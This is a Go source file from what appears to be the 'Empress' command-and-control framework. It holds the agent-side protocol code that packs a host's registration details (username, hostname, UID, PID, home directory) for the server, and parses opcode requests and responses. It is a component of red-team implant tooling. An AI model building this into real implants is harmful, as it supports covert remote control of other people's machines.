package c2

import (
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/pygrum/Empress/consts"
	"github.com/pygrum/Empress/transport"
	log "github.com/sirupsen/logrus"
	"io"
	"net"
	"syscall"
)

func marshalRegistration(reg *transport.Registration) (packet []byte, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("%v", r)
		}
	}()
	size := getRegPacketSize(reg)
	packet = make([]byte, size)
	offset := 4
	binary.BigEndian.PutUint32(packet[:offset], size)
	next := offset + (consts.AgentIDSize * 2)
	copy(packet[offset:next], reg.AgentID)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.OS)))
	offset = next
	next += len(reg.OS)
	copy(packet[offset:next], reg.OS)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.Arch)))
	offset = next
	next += len(reg.Arch)
	copy(packet[offset:next], reg.Arch)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.Username)))
	offset = next
	next += len(reg.Username)
	copy(packet[offset:next], reg.Username)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.Hostname)))
	offset = next
	next += len(reg.Hostname)
	copy(packet[offset:next], reg.Hostname)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.UID)))
	offset = next
	next += len(reg.UID)
	copy(packet[offset:next], reg.UID)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.GID)))
	offset = next
	next += len(reg.GID)
	copy(packet[offset:next], reg.GID)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.PID)))
	offset = next
	next += len(reg.PID)
	copy(packet[offset:next], reg.PID)
	offset = next
	next += 4
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(reg.HomeDir)))
	offset = next
	next += len(reg.HomeDir)
	copy(packet[offset:next], reg.HomeDir)
	offset = next
	return packet, nil
}

func getRegPacketSize(reg *transport.Registration) uint32 {
	var size = 4
	size += consts.AgentIDSize * 2
	size += 4
	size += len(reg.OS)
	size += 4
	size += len(reg.Arch)
	size += 4
	size += len(reg.Username)
	size += 4
	size += len(reg.Hostname)
	size += 4
	size += len(reg.UID)
	size += 4
	size += len(reg.GID)
	size += 4
	size += len(reg.PID)
	size += 4
	size += len(reg.HomeDir)

	return uint32(size)
}
func readPacket(conn net.Conn) ([]byte, error) {
	s := make([]byte, 4)
	if _, err := conn.Read(s); err != nil {
		if isConnClosedError(err) {
			log.Error("connection closed by server")
		}
		return nil, err
	}
	size := uint(binary.BigEndian.Uint32(s))
	buf := make([]byte, size)
	if _, err := conn.Read(buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func marshalResponse(resp *transport.Response) (packet []byte, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("%v", r)
		}
	}()
	size := getRespPacketSize(resp)
	packet = make([]byte, size)
	offset := 4
	binary.BigEndian.PutUint32(packet[:offset], size)
	next := offset + (consts.AgentIDSize * 2)
	copy(packet[offset:next], resp.AgentID)
	offset = next
	next += consts.RequestIDLength
	copy(packet[offset:next], resp.RequestID)
	offset = next
	next += 4
	// marshal the number of responses
	binary.BigEndian.PutUint32(packet[offset:next], uint32(len(resp.Responses)))
	for _, r := range resp.Responses {
		packet[next] = byte(r.Status)
		next++
		packet[next] = byte(r.Dest)
		next++
		offset = next
		next += 4
		binary.BigEndian.PutUint32(packet[offset:next], uint32(len(r.Name)))
		offset = next
		next += len(r.Name)
		copy(packet[offset:next], r.Name)
		offset = next
		next += 4
		binary.BigEndian.PutUint32(packet[offset:next], uint32(len(r.Data)))
		offset = next
		next += len(r.Data)
		copy(packet[offset:next], r.Data)
		offset = next
	}
	return
}

func parseRequest(data []byte) (req *transport.Request, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("%v", r)
		}
	}()
	var args [][]byte
	var offset uint32
	var next uint32 = consts.AgentIDSize * 2
	agentID := string(data[offset:next])
	offset = next
	next += consts.RequestIDLength
	requestID := string(data[offset:next])
	offset = next
	next += 4
	opcode := binary.BigEndian.Uint32(data[offset:next])
	offset = next
	next += 4
	numArgs := binary.BigEndian.Uint32(data[offset:next])
	for i := 0; i < int(numArgs); i++ {
		var s string
		s, next, err = ParseField(next, data)
		if err != nil {
			return nil, err
		}
		args = append(args, []byte(s))
	}
	req = &transport.Request{
		AgentID:   agentID,
		RequestID: requestID,
		Opcode:    int32(opcode),
		Args:      args,
	}
	return
}

func ParseField(sizeOffset uint32, data []byte) (str string, nextOffset uint32, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("invalid data received from connection: %v", r)
		}
	}()
	s := data[sizeOffset : sizeOffset+4]
	size := binary.BigEndian.Uint32(s)
	ret := data[sizeOffset+4 : sizeOffset+4+size]
	return string(ret), sizeOffset + 4 + size, nil
}

func getRespPacketSize(resp *transport.Response) uint32 {
	var size = 4
	size += consts.AgentIDSize * 2
	size += consts.RequestIDLength
	size += 4 // num of responses
	for _, r := range resp.Responses {
		size += 2 // status and dest
		size += 4 // len(name) as uint32
		size += len(r.Name)
		size += 4 // len(data) as uint32
		size += len(r.Data)
	}
	return uint32(size)
}

func isConnClosedError(err error) bool {
	switch {
	case
		errors.Is(err, net.ErrClosed),
		errors.Is(err, io.EOF),
		errors.Is(err, syscall.EPIPE):
		return true
	default:
		return false
	}
}
